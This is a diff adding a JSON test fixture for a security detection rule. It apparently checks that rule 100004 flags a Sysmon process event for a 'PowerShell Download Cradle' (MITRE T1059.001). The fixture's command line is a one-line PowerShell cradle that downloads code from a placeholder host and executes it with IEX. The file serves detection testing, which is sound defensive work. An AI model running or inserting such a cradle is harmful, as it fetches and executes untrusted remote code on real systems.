@@ -1,0 +1,20 @@
+{
+  "detection_id": "DET-003",
+  "technique": "T1059.001",
+  "name": "PowerShell Download Cradle",
+  "expect_rule": "100004",
+  "event": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "severityValue": "INFORMATION",
+        "eventID": 1
+      },
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/test')\""
+      }
+    }
+  }
+}
